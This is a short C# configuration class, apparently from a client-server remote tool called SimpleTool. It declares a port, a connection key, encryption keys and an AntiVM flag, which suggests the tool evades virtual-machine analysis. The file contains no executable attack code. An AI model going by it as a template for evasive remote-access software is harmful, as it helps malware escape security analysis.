using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SimpleTool.Lists;

namespace SimpleTool.Configs
{
    public class ClientConfigDeSerial
    {
        // If you update this update ClientConfig
        public int Port { get; set; }
        public string connectionKey { get; set; }
        public List<EncryptionKeys> EncryptionKeys = new List<EncryptionKeys>();
        public bool AntiVM { get; set; }
        public bool Debug { get; set; }
        public bool AssignNewKeys { get; set; }
    }
}
